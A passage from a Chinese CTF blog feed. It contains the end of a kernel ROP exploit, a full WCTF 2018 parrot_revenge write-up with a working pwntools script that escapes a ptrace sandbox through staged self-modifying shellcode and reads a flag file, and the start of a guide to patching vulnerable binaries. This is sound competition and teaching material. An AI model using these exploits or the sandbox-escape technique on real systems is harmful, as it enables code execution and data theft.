</span><br><span class="line">rop[<span class="number">10</span>] = payload;</span><br><span class="line">rop[<span class="number">11</span>] = swapgs;</span><br><span class="line">rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">13</span>] = iretq ;</span><br><span class="line">rop[<span class="number">14</span>] = get_shell ; </span><br><span class="line">rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">rop[<span class="number">16</span>] = user_eflags;</span><br><span class="line">rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">rop[<span class="number">19</span>] = <span class="number">0</span>;</span><br><span class="line">write(fd,rop,<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">core_copy(fd,<span class="number">0xf000000000000000</span>+<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a></p><p><a href="http://bobao.360.cn/learning/detail/3702.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3702.html</a></p>]]></content>
    
    <summary type="html">
    
      最近刚开始学习内核PWN相关的东西， 把2018年国赛的一道简单内核题作为我的第一道KERNEL PWN，虽然比赛已经过去好久了...
    
    </summary>
    
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【WCTF 2018】parrot_revenge 题解</title>
    <link href="http://p4nda.top/2018/07/11/WCTF-2018/"/>
    <id>http://p4nda.top/2018/07/11/WCTF-2018/</id>
    <published>2018-07-11T03:41:05.000Z</published>
    <updated>2018-07-11T03:59:53.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="parrot-revenge"><a href="#parrot-revenge" class="headerlink" title="parrot_revenge"></a>parrot_revenge</h1><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>题目给出了两个binary文件，分别是parent和parrot_revenge。</p><h3 id="parent"><a href="#parent" class="headerlink" title="parent"></a>parent</h3><p>这是个沙箱程序，使用fork开辟了一个子进程，并用execve将parrot_revenge的子进程加载到当前的代码段，并用ptrace实现了对子进程的监控。</p><p>再看父进程，实现了一个对子进程的沙箱逻辑。具体实现在0x400a33这个函数中：</p><p>首先进行了沙箱的初始化，对于子进程将call malloc处的第一个字节由0xe8改为0xcc，并将原来的值存储起来，这样在子进程执行到call malloc处的时候就会产生一个中断，可以被父进程监听到。</p><p><img src="/img/wctf2018/1-3.png" alt=""></p><p>当执行完成后，父进程会在一个死循环里监听子进程的系统调用，系统调用分为两种，第一种是父进程在初始化时对call malloc的0xcc中断，另外一种是程序正常调用的syscall中断。</p><p>对这两种中断分别的处理方法如下：</p><p>首先检查rip，即程序执行的地址是否为call malloc，进而检查是否执行的代码是0xcc，再检查程序rdi寄存器，也就是函数第一个参数是否在0x6f到0x1000范围内，如果是则rip-1，并恢复call malloc代码，再使用单步执行（singlestep）方法执行一条指令，再次保存call malloc地址指令，并重置为0xcc。</p><p><img src="/img/wctf2018/1-4.png" alt=""></p><p>如不是，则检查系统调用号，当系统调用号不为0、1、9、12，则将子进程杀死。</p><p><img src="/img/wctf2018/1-5.png" alt=""></p><h3 id="parrot-revenge-1"><a href="#parrot-revenge-1" class="headerlink" title="parrot_revenge"></a>parrot_revenge</h3><p>子进程的逻辑很简单，在while循环中循环执行操作，包括malloc、read、write，当控制的局部变量为1时，退出操作。</p><p><img src="/img/wctf2018/1-6.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序在父进程和子进程中均存在漏洞。</p><h3 id="parrot-revenge-2"><a href="#parrot-revenge-2" class="headerlink" title="parrot_revenge"></a>parrot_revenge</h3><p>在子进程中malloc过后，即向得到的地址+size处写\x00操作，这个漏洞和SUCTF 2018的noend题目一样，都未检查malloc函数的返回值，当size过大时，malloc会返回0，这样size+0取决于size，造成一个内存任意写一字节0的漏洞。</p><h3 id="parent-1"><a href="#parent-1" class="headerlink" title="parent"></a>parent</h3><p>父进程中存在一个漏洞，这个漏洞在程序执行call malloc的ptrace(PTRACE_SINGLESTEP, pid, 0LL, 0LL);执行过后，会取得该处指令去更新保存的静态变量，当单步执行改变了call malloc处指令时，程序在下一次执行时就会执行非保存的call指令(\xe8)。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个程序最开始以为是只有一次执行的，因为无法预知栈地址，不能找到程序的循环次数变量来覆写，就很尴尬。一度以为没法做。</p><p>在赛场测试中无意发现，当size取0x4007ae时，会向cmp eax,1处写0，造成程序在while循环中无限循环… 但是在本地却无法更改，没有搭起本地调试环境。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在赛后与主办方交流时候发现，其实这题在题目描述中给了hint来搭建本地环境。</p><p>在题目中提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Env : Linux DESKTOP-ES068S3 4.4.0-17134-Microsoft #81-Microsoft Sun May 20 01:14:00 PST 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>这代表是Windows10操作系统的ubuntu子系统，在比赛结束后，我根据<a href="https://www.jianshu.com/p/bc38ed12da1d" target="_blank" rel="noopener">这篇博客</a>里所述的操作搭建起了环境，注意选择应用商店中的ubuntu 16.04。在搭建好环境后，我使用gdb挂起程序，发现了linux和Windows子系统环境的不同，在Windows的子系统中被ptrace子程序的代码段是rwx的，而linux中是r-x的，这也是赛场环境中可以改代码段的原因。</p><p>Ubuntu 16.04</p><p><img src="/img/wctf2018/1-1.png" alt=""></p><p>Window10子系统ubuntu 16.04</p><p><img src="/img/wctf2018/1-2.png" alt=""></p><h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>在比赛时发现了代码段可以改时，我们进行了疯狂测试，发现全部代码段都是可以改的，只要保证程序汇编指令不崩溃。</p><p>首先我们发现程序主要识别变量的方法是mov rax,[rbp+size]及mov [rbp+size],rax。而size这个变量是单字节表示的，当size=0时，即mov [rbp+0],rax。而在main函数中，rbp指向的内容是_libc_csu_init函数的地址，是在.text段上的0x4007C0位置</p><p><img src="/img/wctf2018/1-7.png" alt=""></p><p>而这个位置位于main函数的高地址部分。</p><p>当修改下图中的ptr变量，即可在每次函数写时，向_libc_csu_init写入内容。</p><p><img src="/img/wctf2018/1-8.png" alt=""></p><p><img src="/img/wctf2018/1-8-1.png" alt=""></p><p>注意到函数的exit(0)调用使用的汇编语句是 e8 82 fd ff ff ff</p><p><img src="/img/wctf2018/1-9.png" alt=""></p><p>这样的call指令跳转方法是用的相对偏移来定的，当我们向该位置写\x00使这条指令变成 e8 82 00 00 00时，就变成了调用当前eip（0x4007be）+0x82的位置——0x400840，而这个位置恰好在0x4007c0的高地址位置，也就是说我们可以先向这个位置写汇编指令，再退出就可以跳转拿到我们预先布置的shellcode上了。</p><p>还需要解决如何退出的问题，我们之前用cmp rax，0来保证程序循环，我们将</p><p><img src="/img/wctf2018/1-10.png" alt=""></p><p>中红框两处代码均改为[rbp+0]，即可达到效果，上述改动需要保证一定的顺序，使得程序不崩溃。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'ize:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">#'4196270'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc2</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line"><span class="comment">#p.send(content)</span></span><br><span class="line"><span class="comment"># cmp 0</span></span><br><span class="line">malloc(<span class="number">0x4007AE</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment"># exit 0*3</span></span><br><span class="line">malloc(<span class="number">0x4007B9</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B8</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B7</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007A5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400789</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400762</span>,<span class="string">''</span>)</span><br><span class="line">core =  shellcraft.amd64.write(<span class="number">1</span>, <span class="string">'input:'</span>, <span class="number">0x10</span>) + shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) + <span class="string">"mov rax,0x400700\njmp rax\n"</span> </span><br><span class="line">shellcode = asm(<span class="string">'lab1 : '</span> + core +<span class="string">'nop\n'</span> * (<span class="number">0x80</span> - len(asm(core,arch = <span class="string">'amd64'</span>))) + <span class="string">'jmp lab1'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">malloc(<span class="number">0x150</span>, shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">malloc(<span class="number">0x400736</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>这样可以执行我们写入的core代码。</p><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>注意到程序本身存在一个ptrace沙箱，只能执行部分系统调用，可以执行的系统调用时read、write、mmap、exit显然不能拿到flag，比赛结束前我们就卡在这里…</p><p>在比赛结束后，听了出题队伍的分享，根据里面的hint做出了沙箱逃逸的部分（PPT照片在最后）</p><p>首先，利用的漏洞就是漏洞分析中提到的，当单步执行的代码会改变该条指令时，即可在下一次执行时改变执行的语句。由于singlestep仅能执行一条指令，所以再执行该条指令时需对执行进行自修改。</p><p>第一次保存的代码是\xe8，即call指令，而call执行时会在栈上push一个返回地址，当将栈指向当前指令执行位置时，可以将该条指令改变，此次将其改变为\x00，shellcode布置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x400700 mov rdi,0x70         #绕过rdi的范围检查</span><br><span class="line">mov r9,0x40073e</span><br><span class="line">xchg rsp,r9</span><br><span class="line">nop nop ; padding</span><br><span class="line">0x40073D \xcc\x00\x00\x00\x00 #在实际运行时会变成call 0x0也就是push返回地址，并继续向下执行</span><br><span class="line">0x400742 mov r9,0x601200</span><br><span class="line">xchg rsp,r9</span><br><span class="line">shellcraft.amd64.write(1,&quot;step 1&quot;,0x6)</span><br><span class="line">shellcraft.amd64.read(0,0x400700,0x100)</span><br><span class="line">mov rax,0x400700</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>在这轮完成后，程序保存在0x40073d位置的指令从\xe8变成了\x00</p><p>我们的目标是执行syscall（\x0f\x05），因此需要在下一次执行时，将\x00变成\x0f</p><p>在一阶段的shellcode中已经构成了输入循环，因此可以再次布置二阶段的shellcode，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x400700 mov rdi,0x70         #绕过rdi的范围检查</span><br><span class="line">mov al,0x0f</span><br><span class="line">mov rcx,0x40073D</span><br><span class="line">nop nop ; padding</span><br><span class="line">0x40073D \xcc\x41\x00\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al</span><br><span class="line">0x400742 mov r9,0x601200</span><br><span class="line">xchg rsp,r9</span><br><span class="line">shellcraft.amd64.write(1,&quot;step 1&quot;,0x6)</span><br><span class="line">shellcraft.amd64.read(0,0x400700,0x100)</span><br><span class="line">mov rax,0x400700</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>这时，保存的\x00变成了\x0f，下一阶段就可以在此处调用syscall了。</p><p>由于父进程对该处的rdi有检查，execve(‘/bin/sh’,0,0)和open(‘/home/chall/flag.txt’,0)就无法调用了，此处调用openat(0x70,”/home/chall/flag.txt”,0)，这个函数第一个参数是文件夹指针，而当第二个参数是绝对路径时无视该指针，与open相同，shellcode3布置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x400700  shellcraft.amd64.openat(0x70,&quot;/home/p4nda/flag.txt&quot;,0)[:-2]</span><br><span class="line">nop nop ; padding</span><br><span class="line">0x40073D \xcc\x05\x90\x90\x90 #在实际运行时会变成00 41 00 也就是 add byte ptr[rcx+0x0],al</span><br><span class="line">0x400742 mov r9,0x601900</span><br><span class="line">xchg rsp,r9</span><br><span class="line">xchg rsp,r9</span><br><span class="line">shellcraft.amd64.read(3,0x601200,0x100)</span><br><span class="line">shellcraft.amd64.write(1,0x601200,0x100)</span><br></pre></td></tr></table></figure><p>即可读出flag，由于在本地测试，flag是我随手写的：</p><p><img src="/img/wctf2018/1-11.png" alt=""></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwnlib.util.iters import bruteforce</span></span><br><span class="line"><span class="comment"># socat TCP4-LISTEN:10001,fork EXEC:"./parent.org ./parrot_revenge"</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug :</span><br><span class="line">p = remote(<span class="string">'10.101.168.102'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.13.222'</span>,<span class="number">31337</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">#p=process(['./parent','./parrot_revenge'] )</span></span><br><span class="line">elf = ELF(<span class="string">'./parrot_revenge'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'ize:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">#'4196270'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc2</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line"><span class="comment">#p.send(content)</span></span><br><span class="line"><span class="comment"># cmp 0</span></span><br><span class="line">malloc(<span class="number">0x4007AE</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment"># exit 0*3</span></span><br><span class="line">malloc(<span class="number">0x4007B9</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B8</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B7</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007A5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400789</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400762</span>,<span class="string">''</span>)</span><br><span class="line">core =  shellcraft.amd64.write(<span class="number">1</span>, <span class="string">'input:'</span>, <span class="number">0x10</span>) + shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) + <span class="string">"mov rax,0x400700\njmp rax\n"</span> <span class="comment">#+ shellcraft.amd64.openat(-3,'/home/p4nda/flag.txt', 0)#shellcraft.amd64.openat('/home/p4nda/flag.txt', 0)</span></span><br><span class="line">shellcode = asm(<span class="string">'lab1 : '</span> + core +<span class="string">'nop\n'</span> * (<span class="number">0x80</span> - len(asm(core,arch = <span class="string">'amd64'</span>))) + <span class="string">'jmp lab1'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">print</span> len(shellcode)</span><br><span class="line">malloc(<span class="number">0x150</span>, shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">malloc(<span class="number">0x400736</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set save_op 0x00</span></span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">"mov rdi,0x70\nmov r9,0x40073e\nxchg rsp,r9\n"</span><span class="comment"># +shellcraft.amd64.read(0,0x400700,0x100)</span></span><br><span class="line">asm_shellcode1 = asm(shellcode1,arch=<span class="string">'amd64'</span>)</span><br><span class="line">asm_shellcode1 = asm_shellcode1.ljust(<span class="number">0x40073D</span><span class="number">-0x400700</span>,<span class="string">'\x90'</span>)</span><br><span class="line">asm_shellcode1 += <span class="string">"\xcc\x00\x00\x00\x00"</span></span><br><span class="line">shellcode1 = <span class="string">"mov r9,0x601200\nxchg rsp,r9\n"</span>+  shellcraft.amd64.write(<span class="number">1</span>,<span class="string">"step 1"</span>,<span class="number">0x6</span>) +  shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) +<span class="string">"mov rax,0x400700\njmp rax\n"</span></span><br><span class="line">asm_shellcode1 += asm(shellcode1,arch=<span class="string">"amd64"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input:'</span>)</span><br><span class="line">p.send(asm_shellcode1)</span><br><span class="line"><span class="comment"># set save_op 0xf0</span></span><br><span class="line"></span><br><span class="line">shellcode2 = <span class="string">"mov rdi,0x70\nmov al,0x0f\nmov rcx,0x40073D\n"</span></span><br><span class="line">asm_shellcode2 = asm(shellcode2,arch=<span class="string">'amd64'</span>)</span><br><span class="line">asm_shellcode2 = asm_shellcode2.ljust(<span class="number">0x40073D</span><span class="number">-0x400700</span>,<span class="string">'\x90'</span>)</span><br><span class="line">asm_shellcode2 += <span class="string">"\xcc\x41\x00\x90\x90"</span></span><br><span class="line">shellcode2 = <span class="string">"mov r9,0x601200\nxchg rsp,r9\n"</span>+  shellcraft.amd64.write(<span class="number">1</span>,<span class="string">"step 2"</span>,<span class="number">0x6</span>) +  shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) +<span class="string">"mov rax,0x400700\njmp rax\n"</span></span><br><span class="line">asm_shellcode2 += asm(shellcode2,arch=<span class="string">"amd64"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'step 1'</span>)</span><br><span class="line">p.send(asm_shellcode2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#openat(0x70,"flag.txt",0)</span></span><br><span class="line">shellcode3 = shellcraft.amd64.openat(<span class="number">0x70</span>,<span class="string">"/home/p4nda/flag.txt"</span>,<span class="number">0</span>)</span><br><span class="line">asm_shellcode3 = asm(shellcode3,arch=<span class="string">'amd64'</span>)[:<span class="number">-2</span>]</span><br><span class="line">asm_shellcode3 = asm_shellcode3.ljust(<span class="number">0x40073D</span><span class="number">-0x400700</span>,<span class="string">'\x90'</span>)</span><br><span class="line">asm_shellcode3 += <span class="string">"\xcc\x05\x90\x90\x90"</span></span><br><span class="line">shellcode3 = <span class="string">"mov r9,0x601900\nxchg rsp,r9\n"</span> +shellcraft.amd64.read(<span class="number">3</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)+  shellcraft.amd64.write(<span class="number">1</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)  <span class="comment">#+ shellcraft.amd64.write(1,0x601200,0x100)</span></span><br><span class="line">asm_shellcode3+= asm(shellcode3,arch=<span class="string">"amd64"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'step 2'</span>)</span><br><span class="line">p.send(asm_shellcode3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><em>TokyoWestern</em>s的ppt</p><p><img src="/img/wctf2018/ppt1.jpg" alt=""></p><p><img src="/img/wctf2018/ppt2.jpg" alt=""></p><p><img src="/img/wctf2018/ppt3.jpg" alt=""></p><p><img src="/img/wctf2018/ppt4.jpg" alt=""></p><p><img src="/img/wctf2018/ppt5.jpg" alt=""></p><p><img src="/img/wctf2018/ppt6.jpg" alt=""></p><p><img src="/img/wctf2018/ppt7.jpg" alt=""></p><p><img src="/img/wctf2018/ppt8.jpg" alt=""></p><p><img src="/img/wctf2018/ppt9.jpg" alt=""></p><p><img src="/img/wctf2018/ppt10.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      参加了WCTF 2018的新锐赛，比赛中队伍共解出3道题目，parrot_revenge题目做到了执行shellcode，但是困在沙箱里面出不来了，本地环境也没搭起来，赛后和vulcan team的大佬交流一下也没有解决问题... 最后听了TokyoWesterns的分享，在赛后复现了这道题。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下赛中常用的PWN题patch方法</title>
    <link href="http://p4nda.top/2018/07/02/patch-in-pwn/"/>
    <id>http://p4nda.top/2018/07/02/patch-in-pwn/</id>
    <published>2018-07-02T11:26:13.000Z</published>
    <updated>2018-07-28T03:54:38.952Z</updated>
    
    <content type="html"><![CDATA[<p>在国赛以后，突然发现对PWN题中的patch方法了解不太深入，尤其是不够优雅，经常就用IDA直接手改了，或者就是用加一个section的方法，导致patch后的文件改动很大，尤其是在国赛中，被主办方打电话过来问是不是加了通防，本文就简单介绍一下常用的patch方法。</p><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>IDA Pro是一个非常强大的工具，其中包含了对汇编指令修改的功能。</p><p>以国赛华北赛区的半决赛为例，其中有一道PWN2是一个栈溢出，代码是这样的。</p><p><img src="/img/patch-in-pwn/1-1.png" alt=""></p><p>很显然，在read这里有一个明显的栈溢出，修复漏洞的方法也和容易，将这个值改小成0x138就好了，下面的write也一样的改法。</p><p>这里使用IDA默认的修改插件来改，在Edit-Patch Program目录下，首先切换到IDA View-A这个汇编指令界面，并选中要改的汇编指令行:</p><p><img src="/img/patch-in-pwn/1-2.png" alt=""></p><p>选择Assemble/Change byte/Change word都可以，以Assemble为例在Instruction窗口，将mov     edx, 1cch改为mov     edx, 138h。</p><p>此时，切换到类C语言窗口可以看到该行已经被修改为了read(a1, &amp;s, 0x138uLL);</p><p><img src="/img/patch-in-pwn/1-3.png" alt=""></p><p>但并没有完，这仅仅修改了IDA对于该文件的数据库，并没有应用到文件中去，同样在Edit-Patch Program目录下，选择Apply patches into file…，将修改写入文件，就完成了一道简单题目的patch。</p><p><img src="/img/patch-in-pwn/1-3.png" alt=""></p><p>这种方法完全依靠手动，而且不能修改文件结构，可以供手动修改的位置也很少，一旦出现如UAF等悬垂指针的问题基本就很难解决了，还得依靠其他更有力的方法来解决。</p><h1 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h1><p>lief是一个开源的跨平台的可执行文件修改工具，链接如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lief-project/LIEF</span><br></pre></td></tr></table></figure><p>对外提供了Python、C++、C的接口。</p><p>对于Python库安装可以使用pip，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install lief</span><br></pre></td></tr></table></figure><p>对于lief的API和用法就不介绍了，RTFM。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lief.quarkslab.com/doc/latest/api/python/index.html</span><br></pre></td></tr></table></figure><p>以下是几种可行的patch方法</p><h2 id="增加segment"><a href="#增加segment" class="headerlink" title="增加segment"></a>增加segment</h2><p>这个方法的目的是增加一个程序段，在这个程序段中加入一个修复漏洞的程序代码，一般程序会在call某个函数时触发漏洞，一般语句为call 0x8041234，可以劫持这句话的逻辑，改成call我们定义的修复函数。</p><p>首先我们的代码程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"/bin/sh%d"</span>,<span class="number">102</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"let's go\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"/bin/sh%d"</span>,<span class="number">102</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"let's gogo\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想把第一处printf修改掉，改成我们自己的逻辑，首先需要编译一个包含实现patch函数的静态库，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 